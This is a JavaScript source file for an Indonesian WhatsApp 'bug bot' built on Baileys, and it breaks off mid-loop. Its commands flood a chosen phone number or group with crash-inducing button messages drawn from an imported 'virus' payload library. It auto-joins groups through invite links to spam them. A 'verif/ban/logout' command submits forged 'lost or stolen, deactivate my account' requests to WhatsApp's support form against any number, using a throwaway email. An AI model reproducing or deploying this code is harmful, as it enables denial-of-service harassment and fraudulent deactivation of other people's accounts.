const { modul } = require('./module');
const { axios, baileys, cheerio, child_process, fs, moment, speed, util, ms } = modul;
const { exec, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./function/myfunc')
const os = require('os')
const { color } = require('./function/color')
const owner = JSON.parse(fs.readFileSync('./options/owner.json').toString())

//Database virus
const { virus } = require('./options/virus/virus')
const { virtex } = require('./options/virus/virtex')
const { philips } = require('./options/virus/philips')
const { ngazap } = require('./options/virus/ngazap')
const { buttonvirus } = require('./options/virus/buttonvirus')
const { buttonvirus2 } = require('./options/virus/buttonvirus2')

global.ownerName = 'Dimas'
global.ownerNumber = ["6288296339947@s.whatsapp.net","6282136086450@s.whatsapp.net"]
global.prefa = ['','.']
global.mess = {
    wait: '⏳ Mohon tunggu sebentar...',
    succes: 'Done🤗',
    admin: 'Command ini hanya bisa digunakan oleh Admin Grup',
    botAdmin: 'Bot Harus menjadi admin',
    owner: 'Command ini hanya dapat digunakan oleh owner bot',
    group: 'Command ini hanya bisa digunakan di grup',
    private: 'Command ini hanya bisa digunakan di Private Chat',
    bot: 'Bot Number User Special Features!!!',
    error: 'Maaf terjadi kesalahan',
}

module.exports = ronzz = async (ronzz, msg, chatUpdate, store) => {
	try {
		const body = (msg.mtype === 'conversation') ? msg.message.conversation : (msg.mtype == 'imageMessage') ? msg.message.imageMessage.caption : (msg.mtype == 'videoMessage') ? msg.message.videoMessage.caption : (msg.mtype == 'extendedTextMessage') ? msg.message.extendedTextMessage.text : (msg.mtype == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : (msg.mtype == 'listResponseMessage') ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : (msg.mtype == 'templateButtonReplyMessage') ? msg.message.templateButtonReplyMessage.selectedId : (msg.mtype === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId || msg.text) : ''
        const budy = (typeof msg.text == 'string' ? msg.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(msg.message)
        const { type, quotedMsg, mentioned, now, fromMe } = msg
        const isCmd = body.startsWith(prefix)
        const from = msg.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = msg.pushName || "No Name"
        const botNumber = await ronzz.user.id.split(':')[0]+'@s.whatsapp.net'
        const itsMeronzz = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(msg.sender)
        const itsMe = msg.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = msg.quoted ? msg.quoted : msg
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariRaya = new Date('January 1, 2024 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariRaya - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const isGroup = from.endsWith('@g.us')
        const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
        const groupMetadata = msg.isGroup ? await ronzz.groupMetadata(from).catch(e => {}) : ''
        const groupName = msg.isGroup ? groupMetadata.subject : ''
        const participants = msg.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = msg.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = msg.isGroup ? groupMetadata.owner : ''
        const groupMembers = msg.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = msg.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = msg.isGroup ? groupAdmins.includes(msg.sender) : false
    	const isAdmins = msg.isGroup ? groupAdmins.includes(msg.sender) : false
    	const reply = (teks) => {ronzz.sendMessage(from, { text: teks }, { quoted: msg })}
	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
} catch (err) {
console.error(err)
}

if (!ronzz.public) {
if (!msg.key.fromMe && !itsMeronzz) return
}

if (!msg.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (msg.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(msg.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (msg.sender.startsWith('212')) return ronzz.updateBlockStatus(msg.sender, 'block')

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

const virusnya = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `Ronzz YT ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

if (command) {
ronzz.sendPresenceUpdate('composing', from)
ronzz.readMessages([msg.key])
}

async function replyNya(teks) {
   const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }] 
   const buttonMessage = { 
text: teks, 
footer: "", 
templateButtons: buttonsDefault, 
image: {url: ppnyauser}   
   }
   return ronzz.sendMessage(from, buttonMessage)
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return ronzz.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
switch (command) {
case 'bugmenu':
case 'help':
case 'menu':
jiren = `*Hallo tuan, ada yg bisa saya bantu? silahkan pilih beberapa menu dibawah.*

*Bug Chats*
> .🥺 628xxx
> .🗿 628xxx
> .🥰 628xxx
> .🤧 628xxx
> .😱 628xxx
> .😎 628xxx
> .🥺 628xxx
> .🌷 628xxx
> .🔥 628xxx
> .💣 628xxx
> .💥 628xxx
> .jembut 628xxx
> .kntl 628xxx
> .mmk 628xxx
> .din 628xxx
> .dor 628xxx
> .koid 628xxx
> .santet 628xxx
> .eksekusi 628xxx
> .virtex 628xxx
> .virus 628xxx
> .philips 628xxx
> .ngazap 628xxx
> .ngazap2 628xxx

*Bug Group*
> .buggc linkgcnya
> .santetgc linkgcnya
> .otwgc linkgcnya
> .wargc linkgcnya
> .peranggc linkgcnya

*Bug Verif*
> .verif 628xxx
> .ban 628xxx
> .logout 628xxx
> .bye 628xxx

*Other Menu*
> .tag ( untuk tag member }
> .restart ( untuk restart bot )
> .stats ( untuk melihat status bot )
> .akses ( untuk beli akses )
> .sewa ( gk open dlu :) )
`

reply(jiren)
break

case 'othermenu':
jiren = `𝗢𝗧𝗛𝗘𝗥
 
【♡ۣۜۜ፝͜͜͡͡✿➣  tag ( untuk tag member }
【♡ۣۜۜ፝͜͜͡͡✿➣  restart ( untuk restart bot )
【♡ۣۜۜ፝͜͜͡͡✿➣  stats ( untuk melihat status bot )
【♡ۣۜۜ፝͜͜͡͡✿➣  akses ( untuk beli akses )
【♡ۣۜۜ፝͜͜͡͡✿➣  sewa ( untuk sewabot dalam grup )
`
reply(jiren)
break

case 'akses':
reply(`UNTUK AKSES BOT CHAT OWNER : https://wa.me/6285669029379`)
break

case 'sewa':
reply(`UNTUK SEWA BOT CHAT OWNER : https://wa.me/6285669029379`)
break

case 'restart':{
let txts = `SUCCES KAK`
reply(txts)
 let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
  let o
  try {
  o = exec('pm2 restart all')
  } catch (e) {
  o = e
 } finally {
let { stdout, stderr } = o
}
}
break
case 'ban':
   case 'bye':
      case 'logout':
case 'verif': {
   var axioss = require ("axios")
   if (!q) return reply(`Penggunaan *${prefix+command} 628xxx*`)
   var numNya = q.replace(/[^0-9]/g, '')
   let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
 let cookie = ntah.headers["set-cookie"].join("; ")
 let $ = cheerio.load(ntah.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
 form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "ID")
 form.append("phone_number", numNya)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
 form.append("your_message", "Perdido/roubado: desative minha conta")
 form.append("__user", "0")
 form.append("__a", "1")
 form.append("__csr", "")
 form.append("__req", "8")
 form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
 form.append("dpr", "1")
 form.append("__ccg", "UNKNOWN")
 form.append("__rev", "1006630858")
 form.append("__comment_req", "0")
 let res = await axioss({
   url,
   method: "POST",
   data: form,
   headers: {
     cookie
   }
 })
 reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
 }
 break
case 'add':
case 'addakses':
if (!args[0]) return reply(`Penggunaan ${prefix+command} @tag/nomor\nContoh ${prefix+command} 0`)
let bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await ronzz.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./options/owner.json', JSON.stringify(owner))
reply(`Nomor ${bnnd} Sudah Bisa Akses!!!`)
break
case 'del':
case 'delakses':
if (!args[0]) return reply(`Penggunaan ${prefix+command} @tag/nomor\nContoh ${prefix+command} 0`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./options/owner.json', JSON.stringify(owner))
reply(`Nomor ${ya} Sudah Tidak Bisa Akses Bot`)
break
case 'tag': { 
ronzz.sendMessage(msg.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: msg })
}
break
case 'test':
case 'stats':{
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
reply(respon)
}
break
case 'wargc':
case 'peranggc':
case 'santetgc':
case 'otwgc':
case 'buggc':{
if (!itsMeronzz) return reply('Belum di addakses')
if (!q) return reply(`Penggunaan *${prefix+command} linkgc*`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
reply(`Otw Boss`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let gcNya = await ronzz.groupAcceptInvite(result)
ronzz.sendMessage(gcNya, {
text: "BUG BY RONZZ YT",
templateButtons: [
{ index: 1, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 2, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 3, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 4, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 5, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 6, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 7, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 8, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 9, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 10, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 11, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 12, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 13, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 14, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 15, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 16, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 17, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 18, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 19, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 20, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 21, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 22, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 23, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 24, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 25, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 26, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 27, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 28, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 29, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 30, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 31, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 32, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 33, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 34, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 35, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 36, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 37, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 38, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 39, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 40, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 41, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 42, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 43, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 44, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 45, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 46, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 47, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 48, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 49, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 50, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 51, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 52, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 53, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 54, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 55, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 56, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 57, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 58, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 59, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 60, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 61, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 62, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 63, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 64, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 65, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 66, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 67, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 68, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 69, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 70, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}}
]}, { quoted: lep })
await sleep(1000)
}
ronzz.groupLeave(gcNya)
reply('SUCCES ✅')
}
break
case '🥰':
case '🤧':
case '😱':
case '😎':
case '🥺':
case '🗿':
case '🌷':
case '💥':
case '💣':
case '🔥':
case 'jembut':
case 'mmk':
case 'kntl':
case 'cok':
case 'din':
case 'koid':
case 'eksekusi':
case 'dor':
case 'santet':
case 'kill':
case 'bom':{
if (!itsMeronzz) return reply('Belum di addakses')
if (!q) return reply(`Penggunaan *${prefix+command} 628xxx*`)
var num = q.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
var waktu = '1s'
var jumlah = '15'
for (let i = 0; i < jumlah; i++) {
ronzz.sendMessage(num, {
text: "BUG BY RONZZ YT",
templateButtons: [
{ index: 1, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 2, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 3, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 4, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 5, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 6, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 7, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 8, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 9, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 10, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 11, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 12, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 13, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 14, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 15, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 16, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 17, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 18, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 19, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 20, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 21, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 22, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 23, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 24, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 25, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 26, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 27, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 28, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 29, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 30, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 31, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 32, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 33, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 34, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 35, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 36, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 37, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 38, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 39, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 40, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 41, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 42, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 43, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 44, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 45, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 46, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 47, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 48, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 49, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 50, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
